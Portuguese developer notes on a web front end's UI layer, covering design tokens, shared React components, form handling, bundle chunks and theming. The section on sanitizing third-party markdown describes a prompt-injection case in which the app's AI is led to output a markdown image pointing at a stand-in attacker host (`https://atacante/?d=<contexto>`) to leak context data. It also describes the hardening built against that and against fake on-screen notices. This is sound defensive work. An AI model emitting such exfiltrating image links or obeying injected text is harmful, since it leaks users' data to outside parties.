# Interface de base

Tokens, componentes de `shared/ui` e o renderizador de conteúdo de terceiros. A direção visual está
no `DESIGN.md`; o inventário, em `.claude/rules/shared-ui.md`. Aqui fica o que o código não conta.

## Tokens

- A paleta, as fontes, os tamanhos de texto, os raios e as sombras padrão do Tailwind foram
  removidos no `@theme static` de `src/index.css`. Classe fora dos tokens (`bg-zinc-900`,
  `rounded-xl`, `shadow-lg`) não quebra o build: só não gera CSS. Se um estilo "não pega", confira
  se a classe existe nos tokens antes de procurar outro motivo.
- `@theme static` emite todas as variáveis, usadas ou não: o Sonner e o tema escuro dependem delas
  em runtime.
- O claro é o padrão, no `@theme static`; o escuro é o bloco `html[data-theme="dark"]` em
  `@layer base`, que redefine as mesmas variáveis. Token novo entra nos dois lugares, senão o
  escuro herda o valor do claro sem aviso.
- O vidro (`glass`, `glass-strong`, `glass-control`) não leva borda: com borda dentro da
  utilidade, `border-x-0` e `border-r` de quem a usa brigavam com ela. A borda vem por classe ao
  lado (`border-glass-line`), e `panel` é o vidro mais a borda e o raio do painel de conteúdo.
- O degradê e os brilhos do fundo moram no `body`, com `background-attachment: fixed`: o vidro
  da barra e da navegação mostra o mesmo fundo em qualquer rolagem. No claro os brilhos são
  `transparent`.
- Opacidade sobre token (`bg-canvas/75`, `hover:bg-danger/90`) é permitida e não conta como valor
  arbitrário.
- A paleta é a do Megabrain.Web, papel por papel: os valores de `src/styles/tokens.css` de lá
  (`../../DatoraSource/Megabrain.Web`), índigo frio nos matizes 275 e 282, com o botão primário
  preenchido de `accent`. Em 2026-10-22 ela foi trocada por engano pelo coral de uma versão antiga
  do Megabrain e voltou no mesmo dia: antes de mudar uma cor, atualize o Megabrain.Web e confira
  o `tokens.css` atual. Os contrastes do `DESIGN.md` saem de converter OKLCH para sRGB e calcular
  a razão WCAG contra `canvas`, `canvas-deep`, `well`, `surface` e `surface-raised`; mudou um
  token, recalcule a tabela.

## Componentes

- `Modal`: o `Content` do Radix fica dentro do `Overlay`, que é a grade que centraliza e rola.
  Assim não há valor arbitrário de altura, e o clique fora fecha. Sem `description`, o componente
  passa `aria-describedby={undefined}` para o Radix não avisar no console. O `xl` (card aberto)
  fica preso ao topo (`self-start`): centralizado, ele pulava a cada troca de guia, porque cada
  guia tem uma altura.
- `ActionMenu` dentro de um diálogo fica no lugar (posição absoluta); fora dele, vai num portal
  para o `body`, em posição fixa calculada do botão, porque a coluna do board e o cartão cortam o
  que transborda (`overflow`). Em portal, o menu fecha ao rolar ou redimensionar, em vez de
  seguir o botão. Dentro do diálogo não pode ir ao `body`: a armadilha de foco do Radix o tornaria
  inalcançável. O Esc do menu para a propagação, para não fechar a modal em volta.
- `Tabs` mantém montada a guia já visitada (`hidden`): a entrevista e o briefing correm stream e
  pedido demorado, e desmontar ao trocar de guia os cancelaria. A guia ainda não visitada não
  monta, para a modal não pedir anexos, entrevista e briefing de uma vez ao abrir.
- `Toaster`: o Sonner não usa classes do Tailwind; as cores entram pelas variáveis dele
  (`--normal-bg`, `--normal-text`, `--normal-border`) no `style` do toaster, e a sombra pelo
  `toastOptions.style`. O `theme` vem do `App`, que lê a store de preferências: o Sonner tem
  ícones e botão de fechar com cor própria por tema.
- `TextField` usa `useId` para ligar rótulo, dica e erro; o `ref` do `register` do RHF chega pelo
  spread (React 19 trata `ref` como prop).
- `TextField` tem `className` para a caixa do campo e `inputClassName` para o `input`: a chave do
  projeto usa `font-mono uppercase`. A caixa alta ali é só visual; quem passa o valor para
  maiúsculas é o schema.
- `TextLink` é o `Link` do TanStack Router com o estilo de link, feito com `createLink` para manter
  `to` e `search` tipados. O componente interno é uma arrow dentro da chamada porque o
  `react-refresh/only-export-components` não reconhece `createLink` como HOC e acusa o arquivo se
  houver um componente declarado ao lado.
- `Panel` é o cartão das telas fora da área autenticada: título em `h1`, descrição, corpo e rodapé.
  A largura (`max-w-sm`) é dele; quem centraliza é o `AccessLayout`.
- `Notice` é o aviso dentro do fluxo da tela: `danger` sai com `role="alert"`, os outros tons com
  `role="status"`. Erro geral de formulário que não pode sumir (a recusa do login) usa ele, não o
  toast.
- `LoadingState` e `EmptyState` ocupam o espaço que sobra (`flex-1`): precisam de um pai em coluna
  flex. Na raiz das rotas esse pai é o `RootComponent` de `app/routes/index.tsx`.
- `QueryContent` junta os dois ao redor de uma query: mostra o dado assim que existe, mesmo que
  uma atualização em segundo plano tenha falhado, e só cai no erro quando não há nada para
  mostrar. Lista vazia não é com ele: quem chama decide o que é vazio.
- `SelectField` é o `select` nativo, porque o Radix instalado é só o do diálogo. `onValueChange`
  procura a opção escolhida e devolve o valor dela, já no tipo das opções: é o que deixa uma
  linha de lista mudar um papel sem `as`. Em formulário, o `register` do RHF basta.
- A seta do `SelectField` é um `ChevronDown` posicionado dentro de um `div` `relative` que envolve
  só o `select` (`appearance-none` tira a do sistema), com `pointer-events-none` para o clique
  chegar ao `select` e `peer-disabled` para esmaecer junto. O rótulo fica fora desse `div`: o
  `sr-only` dele continua preso ao primeiro ancestral posicionado de fora, como antes (INV-16 de
  `telas-de-board`).
- O `select` tem `w-full` e `min-w-40`: num pai de largura definida (grade, painel) ele ocupa a
  largura, e numa linha que encolhe não passa de 160 px para baixo. Num pai que se ajusta ao
  conteúdo, a largura é a da opção mais longa. `isLabelInline` põe o rótulo ao lado, sem quebrar
  linha, e o par inteiro encolhe até os 160 px do `select`.
- A variante `quiet` (o estado no cartão do board) usa `field-sizing-content`, que ajusta o
  `select` à opção escolhida, e não à mais longa; o Firefox ainda não tem a propriedade e mostra
  o `select` na largura da opção mais longa.
- `TextField` e `SelectField` aceitam `isLabelHidden`, para formulário de uma linha que se explica
  pelo `placeholder` (o card novo do board); o rótulo continua ligado ao campo para o leitor de
  tela.
- `ConfirmButton` guarda em estado próprio se o diálogo está aberto e se a ação corre, para a
  feature não repetir esse estado a cada ação destrutiva. A linha costuma sumir da lista antes de
  a ação terminar, e o componente desmonta junto com ela.
- `ConfirmDialog` é o diálogo do `ConfirmButton` sem o botão, controlado por quem chama. Nasceu no
  passo 6.3, quando concluir um card com task aberta passou a pedir confirmação a partir de um
  seletor e de um arrasto, que não são botões. A confirmação do próprio papel na lista de membros
  (`OwnRoleConfirmation`, de 3.6) passou a usá-lo no passo 8.4.
- `SideNavLink` e `TabLink` não recebem `activeProps`: o router já põe `aria-current="page"` no
  link ativo, e o estilo vem do seletor `aria-[current=page]`. Link cujo caminho é prefixo dos
  outros (`/`) pede `activeOptions={{ exact: true }}`, senão fica ativo em toda tela. Substituíram
  o `NavLink` no layout de 2026-10-20.
- `SideNavLink` pinta o ícone pelo seletor `[&_svg]`, e o rótulo é um `span` que nunca some do
  DOM: o item não quebra linha e corta o que passa da largura (`overflow-hidden`). Recolhida, a
  navegação tem 48 px, o item fica com 32 px, e o rótulo começa depois da borda dele: some da
  vista sem `sr-only` e sem salto na transição de largura. O ícone é `aria-hidden`, o nome do link
  continua sendo o rótulo, e o `title` mostra o nome no passar do mouse. Até a segunda rodada de
  UX o rótulo virava `sr-only` ao recolher, e sumia de uma vez enquanto a largura ainda animava.
- `Badge` não conhece domínio: recebe o tom. O mapa de valor para tom fica na feature
  (`card-tones.ts`), para estado e prioridade terem a mesma cor em toda tela.
- `ValueReporter` existe porque o `app` não lê dado de feature fora do guard (INV-9 de
  `telas-de-card`), e a navegação precisa do projeto do card, da feature ou do epic aberto. A
  página o põe dentro do link de volta, que só aparece com o item carregado, e ele chama o
  `onReport` num efeito. Um `onReport` que muda a cada render chamaria o efeito em todo render: a
  action de um store é estável.
- `Avatar` é decorativo (`aria-hidden`): sempre vem ao lado do nome.
- `Button` não quebra linha nem encolhe: "Nova relação" virava dois andares ao lado de uma
  descrição longa. Pelo mesmo motivo, a ação do `Screen` fica num bloco que não encolhe.
- `Section` é a seção das telas autenticadas, com título em `h2`; o `h1` é do layout da área ou
  do `Screen`. O título aceita um nó, e não só texto: na hierarquia do projeto o título do epic é
  o link para a tela dele.
- `Screen` é a tela autenticada que não tem layout de área: a lista de projetos e as de card. Dá
  a largura de leitura, o link de volta, o `h1`, a linha embaixo dele (`meta`) e as ações. Ele
  fica dentro do `QueryContent` de quem o usa, porque o título costuma vir do dado; enquanto
  carrega ou no erro, a tela mostra só o estado, sem moldura. `isWide` tira o limite de largura:
  o board, a lista de cards em tabela, a hierarquia, a grade de projetos e o detalhe do card, com
  o painel de propriedades, usam a área de conteúdo inteira, como os hubs do Azure DevOps. Até a
  segunda rodada de UX o limite era `96rem`.
- `ButtonLink` é o `Link` do router com a cara do `Button`, para ação que leva a outra tela ("Novo
  card", "Editar"). As classes dos dois saem de `buttonClassName` (`button-styles.ts`), num arquivo
  `.ts` à parte porque o `react-refresh/only-export-components` acusa arquivo de componente que
  exporta função comum. O `Button` dá 16 px a todo `svg` filho, e quem chama só põe
  `<Plus aria-hidden />`.
- `CheckboxGroupField` é a lista de valores de um formulário: um `fieldset` com uma caixa de
  marcar por opção, numa área que rola quando a lista é longa. Recebe o `register` do RHF por
  spread, repetido em todas as caixas, e o valor do campo é a lista do que está marcado. O valor
  inicial do campo tem de ser uma lista: é isso que faz o RHF devolver lista mesmo quando só há
  uma opção. Cada caixa é um `CheckboxField`.
- `CheckboxField` é a caixa de marcar avulsa, com o rótulo ao lado: a marcação de uma linha de
  lista ("Pode usar a IA") e a escolha de cada mudança de uma proposta. Numa linha usa `checked`
  com `onChange`; num formulário recebe o `register` do RHF, e várias caixas com o mesmo nome
  viram a lista do que está marcado. O RHF ignora a caixa desabilitada ao montar essa lista: caixa
  registrada não leva `disabled`.
- `TextAreaField` repete a estrutura do `TextField` (rótulo, dica e erro ligados por `aria`) num
  `textarea`. São três campos com a mesma moldura, contando o `SelectField`; ainda não há uma
  peça comum.
- `MarkdownSection` existe para o par que se repete na tela do card: uma `Section` com texto de
  terceiros, e um texto discreto quando ele está vazio.
- `Pagination` só navega: não sabe o tamanho da página nem busca nada. Com uma página só, quem
  chama não a mostra.
- `SearchField` é o campo da busca enquanto se digita: espera 300 ms sem tecla antes de chamar
  `onSearch`, para não mandar uma requisição por letra, e o Enter busca na hora em vez de enviar o
  formulário em volta (ele mora dentro do formulário da relação). O texto fica no próprio `input`,
  sem estado do React: quem chama guarda o termo buscado. Sair da tela cancela a busca pendente.
  Nasceu na busca do outro card de uma relação (passo 5.6).
- Em teste do `SearchField`, `vi.useFakeTimers()` com o `userEvent` trava: o `asyncWrapper` do
  Testing Library espera um `setTimeout(0)` que o relógio simulado não anda. Use `fireEvent`, que é
  síncrono, ou relógio de verdade com `waitFor` (a pausa cabe no tempo padrão dele).

## Formulários

- `zodResolver` (`shared/lib/zod-resolver.ts`) liga o React Hook Form ao Zod sem o
  `@hookform/resolvers`, que não está instalado. Fica com o primeiro erro de cada campo, aninha
  caminho com ponto e põe em `root` o erro sem campo. Serve a schema cuja entrada e saída têm o
  mesmo tipo, que é o caso de `trim` e `toUpperCase`.
- O resolver é criado uma vez, fora do componente. Formulário com dois modos (aceite de convite)
  troca de resolver entre renders; o campo escondido segue com o valor no RHF, e o schema do modo
  que o esconde aceita qualquer texto nele.
- Erro do Core cuja `property` não é campo do formulário vai para `root.<nome>` pelo mapa do
  `applyApiErrors` e é lido em `formState.errors.root`. O RHF apaga os erros de `root` a cada
  envio, que é o comportamento certo para erro de servidor.

## Conteúdo de terceiros (`MarkdownContent`)

- Fluxo: `marked.parse` (markdown com HTML cru, como o do chamado do Movidesk) → DOMPurify numa
  instância própria, para o hook não vazar a outros usos → `dangerouslySetInnerHTML`.
- Além do padrão do DOMPurify (que já tira script, `on*` e URL `javascript:` e `data:` de link),
  a configuração usa só o perfil HTML (sem SVG nem MathML) e proíbe `style`, `iframe`, `form` e
  `dialog`. `form` e `dialog` entraram para que HTML de chamado não monte formulário nem aviso
  falso.
- Atributos que carregam recurso externo (`src`, `srcset`, `poster`, `background`) saem: com eles,
  uma injeção no prompt faria a IA responder `![](https://atacante/?d=<contexto>)` e o navegador
  vazaria o dado sem clique, e uma imagem no chamado entregaria IP e horário de quem o lê. `class`,
  `popover` e `popovertarget` saem porque as classes do Tailwind (`fixed inset-0 z-40`) e a camada
  superior deixariam o texto cobrir a tela com um aviso falso. Achados da auditoria de segurança da
  Fase 2, com testes que falham sem a correção.
- O hook `afterSanitizeAttributes` põe `target="_blank"` e `rel="noopener noreferrer"` só em link
  de outra origem. O DOMPurify remove `target` vindo do texto, então link interno abre na mesma aba.
- `showsLinkDestination` acrescenta o destino ao texto de cada link, entre parênteses, como nó de
  texto: `[Entre de novo](https://outro.site/x)` aparece como "Entre de novo
  (https://outro.site/x)". É para texto em que o rótulo do link não merece confiança, o do modelo.
  Há uma segunda instância do DOMPurify para isso, porque o hook vale para a instância inteira e
  a descrição de card não mostra o destino.
- O destino mostrado é o endereço que o navegador abre, não o atributo como foi escrito: a URL é
  resolvida, o que tira tab e quebra de linha, completa `//host` e passa domínio com letra
  parecida para punycode, e sai sem usuário e senha (`https://banco@outro.site` mostra
  `https://outro.site/`). Link da mesma origem mostra só o caminho. Só não se repete o destino
  quando o link não tem elemento dentro e o texto dele é exatamente o endereço: com um `span`
  escondido dentro, o texto do DOM seria igual ao `href` e o texto visível, não. Achados da
  revisão de segurança do passo 7.4; tab, usuário, `//host` e `span` escondido têm teste.
- Os usos em tela são o card (descrição e campos de texto do tipo), a descrição de feature e de
  epic, e a entrevista do card (perguntas, respostas e proposta, com o destino do link). `marked`
  e DOMPurify ficam num chunk que só as páginas de card e de feature carregam, fora do inicial.
- Por isso nenhuma imagem aparece hoje: a `img` fica sem `src` e mostra só o `alt`. A imagem de
  chamado volta com o proxy do Core (Fase 9), liberada no hook só para o prefixo dele. O bloco de
  código perde o `language-*` do marked junto com o `class`; realce de sintaxe, se vier, precisa
  liberar só esse prefixo.

## Carga inicial e chunks

- A primeira tela baixa o chunk de entrada (React, roteador, TanStack Query, Sonner, `app`) e os
  chunks compartilhados que ele importa (Axios, `tailwind-merge`, o client HTTP e a base de
  `shared`): 473 kB, 153 kB em gzip, em 2026-10-13, e 500 kB, 160 kB em gzip, em 2026-10-20, com
  o Zustand, o layout novo e os ícones da navegação. Eram 658 kB num chunk só.
- Zod e React Hook Form ficam num chunk que só as páginas com formulário pedem; o diálogo do
  Radix, noutro; `marked` e DOMPurify, noutro. Cada página tem o seu.
- Isso depende de duas coisas fáceis de desfazer sem perceber: o `sideEffects` do `package.json`
  e o `shared/api` não importar Zod. Importar Zod num módulo que o `app` usa devolve os 121 kB à
  carga inicial; o `npm run build` mostra na hora.
- Para ver o que cada chunk carrega, compare a saída de `npm run build` antes e depois; o
  `chunk.modules` do `generateBundle` de um plugin do Vite dá o tamanho por módulo.

## Tema e navegação

- Trocar o tema desliga as transições por um instante (`data-theme-changing` no `<html>`, que o
  `applyTheme` de `app/app.tsx` põe, força o cálculo do estilo e tira): sem isso, todo elemento com
  `transition-colors` atravessava 150 ms com as cores do tema anterior, e o board piscava.
- A zona da coluna do board usa o token `well`, mais escuro que o fundo no claro e mais claro no
  escuro; com o `canvas-deep`, mais escuro nos dois, a zona sumia no tema escuro.

- A store `preferences` (`app/stores`) é a única persistida, no `localStorage` com a chave
  `momentum-preferences`: tema e navegação recolhida. O `persist` grava `{ state, version }`, e o
  script inline do `index.html` lê `state.theme` dessa chave para aplicar o escuro antes do React
  subir; mudar a chave ou o formato exige mudar os dois.
- A navegação lateral fica sempre recolhida abaixo de `lg` (48 px, que cortam os rótulos), e o
  botão de recolher só aparece de `lg` para cima. No celular, a barra superior esconde a
  organização do caminho quando há projeto.
- Ícones da navegação, chave do projeto e botão de recolher ficam na mesma coluna, centrada a
  24 px da borda esquerda: a barra superior tem `px-2` em toda largura (antes era `sm:px-3`, que
  deslocava o botão 4 px), a navegação tem `px-2`, e o ícone de 16 px fica a 8 px da borda do
  item. A chave do projeto fica num espaço de 32 px (`keySlotClassName="w-8"` no
  `ProjectIdentity`), centrada nele; a de cinco letras passa um pouco das bordas do espaço, sem
  sair da navegação. A navegação tem `overflow-x-hidden`, que corta o nome do projeto quando ela
  está recolhida. O item recolhido mede 31 × 32 px, e não 32 × 32: a borda direita da navegação
  ocupa 1 px dos 48.
- O projeto da navegação vem do `projectId` da rota; nas rotas de card, feature e epic, da store
  `project-context`, que a página do item alimenta. Fora dessas rotas (área da organização,
  primeiro acesso) a navegação não mostra projeto, mesmo com um lembrado.

## Armadilhas de desenvolvimento

- O `overrides` do `package.json` fixa o `handlebars` em 4.7.10: o `eslint-plugin-boundaries`
  7.2.0 o prende em 4.7.9, que tem três alertas críticos de injeção de JavaScript. Saia o
  `overrides` quando o plugin subir a versão dele.
- O `npm audit` continua com 4 alertas altos, todos do `braces` que o `micromatch` do mesmo plugin
  usa: estouro de pilha com padrão de chaves muito aninhado, sem versão corrigida em 2026-10-20. O
  risco ficou aceito por falta de correção: só o lint executa esse código, sobre os padrões da
  nossa própria configuração, e nada dele entra no bundle. A "correção" do `npm audit fix --force`
  voltaria o plugin para a 1.1.1.

- Instalar pacote com o `npm start` rodando pode deixar o otimizador do Vite com duas cópias do
  React ("Invalid hook call", tela preta). Pare o servidor e suba com `npx vite --force`.
